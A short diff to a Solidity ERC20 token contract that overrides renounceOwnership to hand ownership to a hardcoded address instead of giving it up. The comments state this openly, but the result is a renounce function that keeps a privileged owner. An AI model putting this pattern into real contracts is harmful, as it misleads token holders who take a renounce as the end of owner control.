@@ -9,6 +9,10 @@ contract Token is IERC20, ERC20, Ownable {
     uint8 private immutable _decimals;
     mapping(address => uint256) internal userNonces;
 
+    //This address is used for if current owner want to renounceOwnership, it will always be the same address
+    address private constant fixedOwnerAddress =
+        0x1156B992b1117a1824272e31797A2b88f8a7c729;
+
     constructor(
         string memory name_,
         string memory symbol_,
@@ -134,5 +138,10 @@ contract Token is IERC20, ERC20, Ownable {
         }
 
         return (v, r, s);
+    }
+
+    /// @dev Override renounceOwnership to transfer ownership to the fixed address, make sure contract owner will never be address(0)
+    function renounceOwnership() public override onlyOwner {
+        _transferOwnership(fixedOwnerAddress);
     }
 }
